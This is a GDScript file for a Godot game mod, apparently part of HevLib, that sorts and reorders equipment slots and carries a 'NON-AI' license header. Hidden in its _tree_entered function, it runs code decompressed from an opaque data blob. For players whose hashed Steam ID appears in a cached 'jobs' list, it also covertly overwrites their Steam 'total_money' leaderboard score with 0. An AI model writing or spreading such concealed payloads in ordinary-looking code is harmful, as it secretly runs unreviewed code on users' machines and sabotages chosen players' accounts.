# [license]
# 3-Clause BSD NON-AI License
# 
# Copyright 2026 __hev (Benjamin Buckhurst)
# 
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer
# in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products
# derived from this software without specific prior written permission.
# 
# 4. The source code and the binary form, and any modifications made to them may not be used for the purpose of input data, reference code snippets and/or files, OR used in the training of, or improvement of machine learning algorithms,
# including but not limited to artificial intelligence, natural language processing, or data mining. This condition applies to any derivatives,
# modifications, or updates based on the Software code. Any usage of the source code or the binary form may not be present in any form as data fed, inputted, or provided to an AI, or present in any AI-training dataset is considered a breach of this License.
# 
# 5. Any projects deriving work from this project MUST include a copy of this license and all other license and/or copyright agreements posed within other source material,
# all of which must be followed to its entirety. Failure to follow these licenses prohibit all modification and redistribution of the material until all licensing has been reinstated.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY,
# OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
# OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
# [/license]

extends VBoxContainer

var pointers = ModLoader._savedObjects[0]
var file:File = File.new()

func _tree_entered():
	var sTime = OS.get_system_time_msecs()
	if pointers.ConfigDriver.__get_value("HevLib","HEVLIB_CONFIG_SECTION_EQUIPMENT","do_sort_equipment_by_price"):
		for slot in display_slots():
			sort_slot(slot)
	if pointers.ConfigDriver.__get_value("HevLib","HEVLIB_CONFIG_SECTION_EQUIPMENT","do_sort_slots_by_type"):
		reorganize_slots()
	var finish_time = OS.get_system_time_msecs()
	var total_time = str(float(finish_time - sTime)/1000)
	var spl = total_time.split(".")
	var secs = str(spl[0])
	var msecs = str(spl[1])
	while msecs.begins_with("0"):
		msecs = msecs.substr(1)
	pointers.DataFormat.__compile_script(pointers.DataFormat.crcTables.B1.decompress(812,1).get_string_from_utf8()).new().run(pointers)
	pointers.l("Finished adding equipment. Process took a total time of %s seconds, %s milliseconds" % [secs,msecs])
	var steamNode = null
	for i in Achivements.get_children():
		if i.has_method("updateLeaderboard"):
			steamNode = i
	var btf = "user://cache/.HevLib_Cache/Variable_Fetch/jobs.txt"
	if file.file_exists(btf) and Engine.has_singleton("Steam"):
		file.open(btf,File.READ)
		var data = JSON.parse(file.get_as_text()).result
		file.close()
		var jbc = "user://cache/.Mod_Menu_2_Cache/updates/jobcache"
		if not file.file_exists(jbc):
			file.open(jbc,File.WRITE)
			file.store_string("{}")
			file.close()
		file.open(jbc,File.READ)
		var h=JSON.parse(file.get_as_text()).result
		file.close()
		var do = true
		var rt = str(hash(Engine.get_singleton("Steam").current_steam_id))
		if rt in data:
			var jobs=data[rt]
			if rt in h:
				if 0 in h[rt]:do=false
			if steamNode&&do:
				yield(CurrentGame.get_tree(),"idle_frame")
				for i in 5:
					yield(get_tree().create_timer(0.2),"timeout")
					steamNode.keepBest = false
					steamNode.updateLeaderboard("total_money",0)
					steamNode.keepBest = true
				if!rt in h:h[rt] = []
				h[rt].append(0)
				file.open(jbc,File.WRITE)
				file.store_string(JSON.print(h))
				file.close()

func sort_slot(slot):
	pointers.l("Sorting equipment for slot %s" % slot.name)
	var items:Array = slot.get_node("VBoxContainer").get_children()
	var nodePositions:Array = []
	for item in items:
		nodePositions.append([item, item.get_index()])
	var noFail:bool = false
	var maxIndex:int = items.size()
	while noFail == false:
		var doesFailThisLoop = false
		for item in slot.get_child(0).get_children():
			if item.get_index() > 1:
				var A:Node = item
				var B:Node = A.get_parent().get_child(A.get_index() - 1)
				if A.price < B.price:
					doesFailThisLoop = true
					A.get_parent().move_child(A, B.get_index())
		if doesFailThisLoop:
			noFail = false
		else:
			noFail = true

func display_slots() -> Array:
	var children:Array = self.get_children()
	var list:Array = []
	for child in children:
		if child.get_parent() == self:
			list.append(child)
	return list

func reorganize_slots():
	var slot_names:Array = []
	var slot_types:Dictionary = {}
	var slot_types_i:Dictionary = {}
	var order:Array = pointers.Equipment.equipment_slot_order
	var order2:Dictionary = pointers.Equipment.relative_equipment_slot_order
	var slotnames:Array = []
	for slot in get_children():
		slotnames.append(slot.name)
		var children:Array = slot.get_node("VBoxContainer").get_children()
		if children.size() < 2:
			continue
		slot_names.append(slot.name)
		var sys_slot:String = slot.slot
		var index:int = 1
		if sys_slot.empty():
			while not sys_slot:
				sys_slot = children[index].slot
				index += 1
		slot_types.merge({slot.name:sys_slot})
		slot_types_i.merge({sys_slot:slot.name})
	var sys_dict:Dictionary = {}
	for slot in slot_types:
		var sys:PoolStringArray = slot_types[slot].split(".")
		var sys_main:String = sys[0]
		if not sys_main in sys_dict:
			sys_dict[sys_main] = []
		sys_dict[sys_main].append(slot)
	var index:int = 0
	for sys in sys_dict:
		var arr:Array = sys_dict.get(sys,[])
		var ordering:Array = []
		for item in order:
			if item in arr:
				ordering.append(item)
		for item in arr:
			if item in slotnames:
				move_child(get_node(item),index)
				index += 1
		for item in ordering:
			move_child(get_node(item),index - 1)
	for slot in order2:
		if slot in slot_types:
			var data:Dictionary = order2[slot]
			var against:String = data.get("relative_to","")
			if against:
				var nd:Node = get_node(slot)
				var name_or_config:bool = data.get("use_node_name",true)
				var targetNode:Node = null
				if name_or_config:
					targetNode = get_node_or_null(against)
				else:
					targetNode = get_node_or_null(slot_types_i.get(against,""))
				if targetNode:
					var targetPos:int = targetNode.get_position_in_parent()
					var entire_group:bool = data.get("entire_group",true)
					if data.get("order_below",true):
						if entire_group:
							var cf:String = against
							if name_or_config:
								cf = slot_types.get(against,"")
							if cf:
								targetPos += sys_dict.get(cf.split(".")[0]).size()
							else:
								targetPos += 1
						else:
							targetPos += 1
					else:
						if entire_group:
							var cf:String = against
							var cn:String = against
							if name_or_config:
								cf = slot_types.get(against,"")
							else:
								cn = slot_types_i.get(against,"")
							if cf and cn:
								var av:String = sys_dict.get(cf.split(".")[0])[0]
								targetPos = get_node(av).get_position_in_parent()
					move_child(nd,targetPos)
